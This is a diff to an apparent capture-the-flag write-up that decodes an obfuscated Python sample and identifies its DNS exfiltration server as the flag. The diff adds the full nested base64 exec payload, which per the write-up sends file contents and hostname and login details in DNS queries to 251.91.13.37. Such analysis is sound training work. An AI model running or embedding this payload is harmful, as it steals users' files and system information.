@@ -61,7 +61,12 @@ index 7461804..126a027 100644
 ```
 ## Decoding
 
-I performed Base64 decoding on the string.
+I performed base64 decoding on the string.
+
+Encoded string:
+```python
+exec(ute("ZXhlYyh1dGUoIlpuSnZiU0JpWVhObE5qUWdhVzF3YjNKMElIVnliSE5oWm1WZllqWTBaVzVqYjJSbCIpKQpleGVjKHV0ZSgiWm5KdmJTQnBieUJwYlhCdmNuUWdRbmwwWlhOSlR3PT0iKSkKZXhlYyh1dGUoIlpuSnZiU0JrYm5NdWJXVnpjMkZuWlNCcGJYQnZjblFnYldGclpWOXhkV1Z5ZVE9PSIpKQpleGVjKHV0ZSgiWm5KdmJTQmtibk11Y1hWbGNua2dhVzF3YjNKMElIVmtjQT09IikpCmV4ZWModXRlKCJabkp2YlNCNmJHbGlJR2x0Y0c5eWRDQmpiMjF3Y21WemN3PT0iKSkKZXhlYyh1dGUoIlpHVm1JSEVvYzJRc0lIUXBPZ29nSUNBZ2RXUndLRzFoYTJWZmNYVmxjbmtvWmlKN2MyUjlJaXdnZENrc0lDSXlOVEV1T1RFdU1UTXVNemNpTENCd2IzSjBQVEJ2TmpVcCIpKQpleGVjKHV0ZSgiWHlBOUlFSjVkR1Z6U1U4b2RYSnNjMkZtWlY5aU5qUmxibU52WkdVb1kyOXRjSEpsYzNNb2IzQmxiaWh6YjNWeVkyVXNJQ2R5WWljcExuSmxZV1FvS1NrcEtRPT0iKSkKZXhlYyh1dGUoImQyaHBiR1VnWDE4Z09qMGdYeTV5WldGa0tEQnZOemNwTG1SbFkyOWtaU2dwTG5OMGNtbHdLQ0k5SWlrNkNpQWdJQ0JsZUdWaktIVjBaU2dpWTFOb1psaDVkMmROUnpoNVRVTnJQU0lwS1E9PSIpKQpleGVjKHV0ZSgiWHlBOUlHWWllMjl6TG5WdVlXMWxLQ2t1YzNsemJtRnRaWDB1ZTI5ekxuVnVZVzFsS0NrdWJXRmphR2x1WlgwdWUyOXpMblZ1WVcxbEtDa3VibTlrWlc1aGJXVjlMbnR2Y3k1blpYUnNiMmRwYmlncGZTST0iKSkKZXhlYyh1dGUoImNTaGZMQ0F3YnpFcCIpKQpleGVjKHV0ZSgiY1NoemIzVnlZMlVzSURCdk16UXAiKSk="))
+```
 
 First round of decode:
 
@@ -87,7 +92,7 @@ from base64 import urlsafe_b64encodefrom io import BytesIOfrom dns.message impor
 f"{os.uname().sysname}.{os.uname().machine}.{os.uname().nodename}.{os.getlogin()}"_ = f"{os.uname().sysname}.{os.uname().machine}.{os.uname().nodename}.{os.getlogin()}"q(source, 0o34)
 ```
 
-We can see that this code is sending DNS queries over UDP to IP address `251.91.13.37` on port DNS. It reads and compresses a file, encodes it as base64, and splits it into chunks. Those chunks get embedded in DNS TXT queries. System information gets sent in a DNS AAAA query.
+This code is sending DNS queries over UDP to IP address `251.91.13.37` on port DNS. It reads and compresses a file, encodes it as base64, and splits it into chunks. The chunks get embedded in DNS TXT queries. System information gets sent in a DNS AAAA query.
 
 **Flag:** ```251.91.13.37```
 
